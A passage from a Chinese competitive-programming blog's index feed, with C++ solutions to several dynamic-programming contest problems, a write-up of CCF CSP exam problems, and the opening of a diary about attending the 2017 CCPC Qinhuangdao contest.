class="built_in">scanf</span>(<span class="string">"%s%s"</span>,a+<span class="number">1</span>,b+<span class="number">1</span>)!=EOF) &#123;</div><div class="line">        <span class="keyword">int</span> n=<span class="built_in">strlen</span>(a+<span class="number">1</span>);</div><div class="line">        <span class="keyword">int</span> m=<span class="built_in">strlen</span>(b+<span class="number">1</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++) &#123;</div><div class="line">                <span class="keyword">if</span> (a[i]==b[j]) dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</div><div class="line">                <span class="keyword">else</span> dp[i][j]=max(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,dp[n][m]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="E-Max-Sum"><a href="#E-Max-Sum" class="headerlink" title="E - Max Sum"></a><a href="https://vjudge.net/problem/HDU-1003" target="_blank" rel="noopener">E - Max Sum</a></h3><p>经典问题，最大子列和。（<strong>连续子序列</strong>，相当于子串）<br>状态转移方程也比较简单：<br>$$dp(i)=max(dp(i-1)+a[i],a[i])=max(dp(i-1),0)+a[i]$$ 分别对应两种情况：</p><ol><li>接在上一次序列的后面</li><li>开始一个新的序列</li></ol><p>输出的字典序最小意味着左端点和右端点都要最小。如果先记录右端点再反向计算左端点，那么：</p><ul><li>$dp$值相等时，右端点不被更新</li><li>和相等时，左端点要被更新</li></ul><p>当然也有其它的记录方法，比如利用数组。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1</span>&lt;&lt;<span class="number">28</span>;</div><div class="line"><span class="keyword">int</span> a[N],f[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,cas=<span class="number">0</span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> ans=-INF,p,q;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            f[i]=max(f[i<span class="number">-1</span>],<span class="number">0</span>)+a[i];</div><div class="line">            <span class="keyword">if</span> (f[i]&gt;ans) &#123;</div><div class="line">                ans=f[i];</div><div class="line">                q=i;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> now=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=q;i&gt;=<span class="number">1</span>;i--) &#123;</div><div class="line">            now+=a[i];</div><div class="line">            <span class="keyword">if</span> (now==ans) p=i;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Case %d:\n"</span>,++cas);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>,ans,p,q);</div><div class="line">        <span class="keyword">if</span> (T) <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="H-不要62"><a href="#H-不要62" class="headerlink" title="H - 不要62"></a><a href="https://vjudge.net/problem/HDU-2089" target="_blank" rel="noopener">H - 不要62</a></h3><p>常见$dp$类型：数位$dp$。可以使用数位$dp$的$dfs$型模板，原理自行查阅。<br><em>ps.</em> 这题数据量比较小，可以预处理$O(1)$回答，但是大家还是要好好学习数位$dp$滴。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">using</span> ll = <span class="keyword">long</span> <span class="keyword">long</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> D=<span class="number">22</span>;</div><div class="line"><span class="keyword">int</span> dig[D];</div><div class="line">ll f[D][<span class="number">10</span>][<span class="number">2</span>];</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos,<span class="keyword">int</span> pre,<span class="keyword">int</span> fg,<span class="keyword">int</span> limit)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (pos&lt;<span class="number">0</span>) <span class="keyword">return</span> fg==<span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (!limit&amp;&amp;f[pos][pre][fg]!=<span class="number">-1</span>) &#123;</div><div class="line">        <span class="keyword">return</span> f[pos][pre][fg];</div><div class="line">    &#125;</div><div class="line">    ll res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> last=limit?dig[pos]:<span class="number">9</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=last;i++) &#123;</div><div class="line">        res+=dfs(pos<span class="number">-1</span>,i,fg||(pre==<span class="number">6</span>)&amp;&amp;(i==<span class="number">2</span>)||i==<span class="number">4</span>,limit&amp;&amp;(i==last));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!limit) f[pos][pre][fg]=res;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">solve</span><span class="params">(ll n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (n) &#123;</div><div class="line">        dig[len++]=n%<span class="number">10</span>;</div><div class="line">        n/=<span class="number">10</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> dfs(len<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,m;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m)!=EOF) &#123;</div><div class="line">        <span class="keyword">if</span> (!n&amp;&amp;!m) <span class="keyword">break</span>;</div><div class="line">        <span class="built_in">memset</span>(f,<span class="number">-1</span>,<span class="keyword">sizeof</span>(f));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,solve(m)-solve(n<span class="number">-1</span>));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="I-Unidirectional-TSP"><a href="#I-Unidirectional-TSP" class="headerlink" title="I - Unidirectional TSP"></a><a href="https://vjudge.net/problem/HDU-1619" target="_blank" rel="noopener">I - Unidirectional TSP</a></h3><p>常见$dp$类型：网格图$dp$。如果不考虑上下可以穿越，那么转移方程非常简单：<br>$$dp(i,j)=min(dp(i-1,j-1),dp(i,j-1),dp(i+1,j-1))$$ 上下可以穿越时，需要根据$i$的值特殊处理一下，代码里用的是三目表达式。<br>因为题目要求输出路径，所以用$a_i$储存前一列可以转移过来的行号，又因为题目里要求字典序最小，所以先排个序，之后按照顺序更新，并约定<strong>值相等的不能更新</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">110</span>,INF=<span class="number">1</span>&lt;&lt;<span class="number">28</span>;</div><div class="line"><span class="keyword">int</span> dp[N][N],pre[N][N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,m;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m)!=EOF) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++) &#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;dp[i][j]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">                <span class="keyword">int</span> a[<span class="number">3</span>]=&#123;i&#125;;</div><div class="line">                a[<span class="number">1</span>]=(i==<span class="number">1</span>)?n:i<span class="number">-1</span>;</div><div class="line">                a[<span class="number">2</span>]=(i==n)?<span class="number">1</span>:i+<span class="number">1</span>;</div><div class="line">                sort(a,a+<span class="number">3</span>);</div><div class="line">                <span class="keyword">int</span> x=INF,y=<span class="number">-1</span>;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">3</span>;k++) &#123;</div><div class="line">                    <span class="keyword">if</span> (dp[a[k]][j<span class="number">-1</span>]&lt;x) &#123;</div><div class="line">                        x=dp[y=a[k]][j<span class="number">-1</span>];</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">                dp[i][j]+=x;</div><div class="line">                pre[i][j]=y;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> x=INF,y=<span class="number">-1</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (dp[i][m]&lt;x) &#123;</div><div class="line">                x=dp[y=i][m];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; st;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=m;j&gt;=<span class="number">1</span>;j--) &#123;</div><div class="line">            st.push(y);</div><div class="line">            y=pre[y][j];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">bool</span> fi=<span class="literal">true</span>;</div><div class="line">        <span class="keyword">while</span> (!st.empty()) &#123;</div><div class="line">            <span class="keyword">if</span> (fi) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%d"</span>,st.top());</div><div class="line">                fi=<span class="literal">false</span>;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">" %d"</span>,st.top());</div><div class="line">            &#125;</div><div class="line">            st.pop();</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n%d\n"</span>,x);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="J-DZY-Loves-Sequences"><a href="#J-DZY-Loves-Sequences" class="headerlink" title="J - DZY Loves Sequences"></a><a href="https://vjudge.net/problem/CodeForces-447C" target="_blank" rel="noopener">J - DZY Loves Sequences</a></h3><p>常见类型：扫一遍预处理。分别求出向左和向右最多可以延伸的长度，然后对于每一个$a_i$：</p><ul><li>如果$a_{i-1} + 1 \lt a_{i+1}$，那么$a_i$可以修改为$a_{i-1}$和$a_{i-1}$之间的某个数使得左右两段连接在一起</li><li>如果$a_{i-1} + 1 \ge a_{i+1}$，那么$a_i$只能修改为比$a_{i-1}$大或者比$a_{i-1}$小的数，即左长度加一或者右长度加一</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</div><div class="line"><span class="keyword">int</span> a[N],l[N],r[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,a+i);</div><div class="line">    &#125;</div><div class="line">    l[<span class="number">1</span>]=<span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (a[i<span class="number">-1</span>]&lt;a[i]) l[i]=l[i<span class="number">-1</span>];</div><div class="line">        <span class="keyword">else</span> l[i]=i;</div><div class="line">    &#125;</div><div class="line">    r[n]=n;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=n<span class="number">-1</span>;i;i--) &#123;</div><div class="line">        <span class="keyword">if</span> (a[i]&lt;a[i+<span class="number">1</span>]) r[i]=r[i+<span class="number">1</span>];</div><div class="line">        <span class="keyword">else</span> r[i]=i;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">        l[i]=i-l[i]+<span class="number">1</span>;</div><div class="line">        r[i]=r[i]-i+<span class="number">1</span>;</div><div class="line">        ans=max(ans,max(l[i],r[i]));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (a[i<span class="number">-1</span>]+<span class="number">1</span>&lt;a[i+<span class="number">1</span>]) &#123;</div><div class="line">            ans=max(ans,l[i<span class="number">-1</span>]+<span class="number">1</span>+r[i+<span class="number">1</span>]);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            ans=max(ans,max(l[i<span class="number">-1</span>]+<span class="number">1</span>,r[i+<span class="number">1</span>]+<span class="number">1</span>));</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CSP超级合集</title>
      <url>/blog/2018/01/16/CSP%E8%B6%85%E7%BA%A7%E5%90%88%E9%9B%86/</url>
      <content type="html"><![CDATA[<h3 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h3><p>听说考得好写在简历里很不错，准备参加三月份的CSP。<br>仅含题解，代码详见<a href="https://github.com/Smlight/CCFCSP" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="201712-1-最小差值"><a href="#201712-1-最小差值" class="headerlink" title="201712-1 最小差值"></a>201712-1 最小差值</h3><p>sb-t。随便暴力一下。</p><h3 id="201712-2-游戏"><a href="#201712-2-游戏" class="headerlink" title="201712-2 游戏"></a>201712-2 游戏</h3><p>sb-t。<strong>BUT，</strong>读题的时候没读到<code>或其末位数（即数的个位）为k</code>，直接当约瑟夫做了。。。<br>最垃圾的做法就是拿数组标记一下，手动控制环。（没错我就是这么做的，写起来还是很快的</p><h3 id="201712-3-Crontab"><a href="#201712-3-Crontab" class="headerlink" title="201712-3 Crontab"></a>201712-3 Crontab</h3><p>还没读完题头都大了，写完第4题的第一稿才开始动手做。题目虽然很长，题意其实还是挺清晰的。<br>核心算法就是模拟，用了一次蔡勒公式算出星期几。输入处理简单来讲的话就是，先按‘ ’（空格）split，每段再按‘,’（逗号）split，每段再按‘-’（减号）split，然后再转换成非负整数标记到这个$crontab$对应的布尔数组，比如周一周二那就是在一周的数组中标记$1$和$2$，详见代码。最后从起始到终止一分钟一分钟往上加，每一分钟都枚举$n$个$crontab$判断一下是否满足。算了一下极限复杂度稍微有点方，不过看了一下输出不超过10000行，应该不会TLE。<br>思考加打代码估计有一个多小时。。。最后交上去一看，85分，难道还是TLE了？结果点进去一看是WA，有点懵逼。又读了一遍题，还是没啥发现。查了查别人代码发现好像英文缩写不区分大小写，然后回到题目里一看，中间有一句确实写着，唉。。。</p><h3 id="201712-4-行车路线"><a href="#201712-4-行车路线" class="headerlink" title="201712-4 行车路线"></a>201712-4 行车路线</h3><p><em>ps.</em> <code>201712-4.cpp</code>是60分代码，<code>201712-4S.cpp</code>是满分代码。<br>其实核心思想跟之前是差不多的。首先因为小道的费用（和的平方）没有可加性，所以就要把小道全都做成$tp$（传送卷轴）：启动$tp$以后可以花费一定的费用从一个点传送到另一个点。其次为了保证小道的费用不可加，要限制$tp$不能连续使用，连续使用时费用缩水（$1^2+1^2&lt;(1+1)^2$）。<br>具体实现是：首先用$Floyd$求出只用小道的任意点对间的距离，把这些距离的平方作为$tp$的费用存下来。然后用$SPFA$求单源最短路，分别用两个数组记录$tp$过来的（$dis1$）和从大道过来的（$dis0$），对于边$u\rightarrow  v$，$tp$到$u$的不能再通过$tp$到$v$，其它的不作限制。最后输出$min(dis0(n),dis1(n))$即可。<br><em>ps.</em> $Floyd+SPFA$有风险，一点不考虑常数优化的话交上去<strong>只有50分</strong>，比$dijkstra$乱搞还低。</p><h3 id="201712-5-商路（60分）"><a href="#201712-5-商路（60分）" class="headerlink" title="201712-5 商路（60分）"></a>201712-5 商路（60分）</h3><p>没剩太多时间，$n^2$直接上，小数据一分没丢。<em>yes!</em></p><h3 id="201712-总结"><a href="#201712-总结" class="headerlink" title="201712 总结"></a>201712 总结</h3><p>最近的一场，比较真实地模拟了一下（最后才一起提交），结果才320分，5个题第2题最低，好SB啊。。。</p><ol><li><strong>仔细读题非常重要！</strong>第2题读对可以多70分，第3题完全读对可以多15分，这样勉强可以上400</li><li><strong>想不到正解要快速把握部分分。</strong>从中学开始就喜欢比赛时先想正解，但是水平又不太行，经常会花大把时间做无用功。第4题大概改写了两三遍，如果一开始就想着先按60分的写，第2/5题分配到的时间就会再多一点。时间一多，分数就有上涨的可能，特别是第2题我还看着$k$的数据范围奇怪了一会儿，最后还是没发现那句话。。。</li></ol><p>这两点说起来容易，其实还是挺有难度的，看来要多加训练了。。。</p><p>=========UPDATE=========<br>好像认证是四个小时，我一直当三个小时练的，应该不会时间太吃紧了。。。</p><h3 id="201709-1-打酱油"><a href="#201709-1-打酱油" class="headerlink" title="201709-1 打酱油"></a>201709-1 打酱油</h3><p>sb-t。随便贪心一下。</p><h3 id="201709-2-公共钥匙盒"><a href="#201709-2-公共钥匙盒" class="headerlink" title="201709-2 公共钥匙盒"></a>201709-2 公共钥匙盒</h3><p>小模拟，核心就是给所有事件排序。</p><h3 id="201709-3-JSON查询"><a href="#201709-3-JSON查询" class="headerlink" title="201709-3 JSON查询"></a>201709-3 JSON查询</h3><p>中等模拟，除了基本的split以外，涉及到了括号匹配的知识，只有同一层的括号它们才有可能组成一个JSON对象。<br>具体来讲，可以一边dfs一边建树，但是传个字符串递归总是很慢的，我的习惯是传一下左右边界。建树的节点都是整数标识，再用额外的数组存一下key-value。然后查询的时候一层一层地查，每层有以下几种情况：</p><ol><li>子节点没有对应的串，一定返回“NOTEXIST”</li><li>子节点有对应的串，查询串没有下一层，要么“STRING”要么“OBJECT”</li><li>子节点有对应的串且是对象，查询串有下一层，继续递归</li><li>子节点有对应的串且是字符串，查询串有下一层，返回“NOTEXIST”</li></ol><p><em>手动处理累手不累脑子</em></p><h3 id="201709-4-通信网络"><a href="#201709-4-通信网络" class="headerlink" title="201709-4 通信网络"></a>201709-4 通信网络</h3><p>刚读完懵逼了，写了一大堆乱七八糟的。。。<br>其实就是原图和反图bfs一下，然后可达点取个并集，是全集就给答案加一。</p><h3 id="201709-5-除法"><a href="#201709-5-除法" class="headerlink" title="201709-5 除法"></a>201709-5 除法</h3><p>50：暴力，每次缩小和求和都扫一遍<br>100：查到几个树状数组的做法，感觉复杂度完全不对，代码放了，正解待定。</p><h3 id="201709-总结"><a href="#201709-总结" class="headerlink" title="201709 总结"></a>201709 总结</h3><p>前4题检查了一遍，第5题打了个暴力，然后啥都不想干就交了，毕竟不是真实考试。。。好在前4题都过了，第5题暴力也很成功。<br><strong>第4题大改，检查很有必要。</strong></p><h3 id="201403-1-相反数"><a href="#201403-1-相反数" class="headerlink" title="201403-1 相反数"></a>201403-1 相反数</h3><p>不会重复，直接取绝对值找出现两次的。</p><h3 id="201312-1-出现次数最多的数"><a href="#201312-1-出现次数最多的数" class="headerlink" title="201312-1 出现次数最多的数"></a>201312-1 出现次数最多的数</h3><p>sb-t。计数随便扫一下。</p><h3 id="201312-2-ISBN号码"><a href="#201312-2-ISBN号码" class="headerlink" title="201312-2 ISBN号码"></a>201312-2 ISBN号码</h3><p>sb-t。随便模拟一下。</p><h3 id="201312-3-最大的矩形"><a href="#201312-3-最大的矩形" class="headerlink" title="201312-3 最大的矩形"></a>201312-3 最大的矩形</h3><p>easy mode：枚举左端点，枚举右端点，顺便维护最小值，乘一下更新一下。<br>medium mode：考虑枚举一个点，并使该点就是区间中最低的，那么就是要求向左向右第一个低于当前点的。这件事情可以用单调栈来搞，正反各一遍。</p><h3 id="201312-4-有趣的数"><a href="#201312-4-有趣的数" class="headerlink" title="201312-4 有趣的数"></a>201312-4 有趣的数</h3><p>一眼看上去想搜索，但是仔细一想。。。是个数学题，稍微懵逼了一会儿，还是要慢慢来，列列式子。<br>因为0都在1之前，也就是说最后一个0在第一个1之前，那么它们可以看作一个整体。又因为每个数字至少出线一次，所以第一个一定是0。23同理。<br>设0和1的总位数是$x$，那么首先要在$n$位中选出$x$位，又因为整个串的第一位不能是0，所以应该是$n-1$位，即$C_{n-1}^{x}$。剩下的$n-x$位分给23。然后在这x位中，只要选一个位置断开，前面是0后面是1即可。枚举最末的0，除了不能在最后都可以（必须有1）。23同理。所以答案等于$C_{n-1}^{x} C_{x-1}^{1} C_{n-x-1}^{1}，2 \le x \le n-2$。$n$小于等于1000，阶乘打表或者组合数打表，随便搞搞。</p><h3 id="201312-5-I’m-stuck"><a href="#201312-5-I’m-stuck" class="headerlink" title="201312-5 I’m stuck!"></a>201312-5 I’m stuck!</h3><p>70：我以为$50^4$肯定能过的。。。直接写了个先起点bfs再每个格子bfs的。。。TLE<br>100：可以直接连边在图上和反图上搜。但是不太想重写，所以加了一个反向搜的函数，注意反向的时候判断的是要到的那个格子的连通方向。</p><h3 id="201312-总结"><a href="#201312-总结" class="headerlink" title="201312 总结"></a>201312 总结</h3><p>作为全系列第一场，非常简单，甚至不需要什么算法知识就能ak。</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017 CCPC 秦皇岛站游记</title>
      <url>/blog/2017/12/08/2017-qinhuangdao-play/</url>
      <content type="html"><![CDATA[<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a><strong>正文</strong></h3><h4 id="BEFORE"><a href="#BEFORE" class="headerlink" title="BEFORE"></a><em>BEFORE</em></h4><p>我校网赛打出来一个名额，教练钦定我们队去。<br>现在都是固定队了，我的队友是 wenwenla 和 jxc 。</p><p>自从听说浙大出题以后，我就一直努力想把zimpha出过的bestcoder都过一遍。<br>【虽然他不出这场但是我感觉题目风格可能有传承？咸鱼的挣扎 ←_←<br>结果发现他出过的bc题实在是太多了。。。于是就按照vj的规格拉了最近的26题练了练。。。非常重视思维，怎么说呢，感觉上没什么套路题，详见<a href="https://smlight.github.io/blog/2017/10/18/zimpha%E7%9A%84bc%E5%87%BA%E9%A2%98%E5%BD%95/">zimpha的bc出题录</a>。</p><h4 id="Oct-26"><a href="#Oct-26" class="headerlink" title="Oct 26"></a><em>Oct 26</em></h4><p>翻了翻高中通讯录，有一个东秦的同学，非常高兴地问她借了词典~<br>晚上让队友把这个简要题解也都过一遍，然后买了泡面和小香肠啥的第二天吃。</p><h4 id="Oct-27"><a href="#Oct-27" class="headerlink" title="Oct 27"></a><em>Oct 27</em></h4><p>没有老师带队，我们自己坐高铁去，睡睡觉吃吃面看看片，日子过得还是挺开心的。路上感觉河北的污染确实比较严重，然后在高铁上问AA姐姐要了几个口罩2333333<br>下了高铁坐公交，跟wc一路。找到宾馆直接从人家后厨就进去了。。。还好找到了报到的地方，真的发了环卫工人服，一切正常。<br>安顿了一下就是饭点了，出去吃了个酱骨自助，竟然有个烧烤和小锅一体的机器！长见识。<br>吃了很久，筒骨还是蛮油的，差点肉醉[笑cry]<br>很饱的我们于是就想散个步，强行在老虎石公园拍了很多照片【基本看不清啥<br>逛完了出来看到卖手链的，问了问看了看，然后每个人买了个指尖陀螺？？？</p><h4 id="Oct-28"><a href="#Oct-28" class="headerlink" title="Oct 28"></a><em>Oct 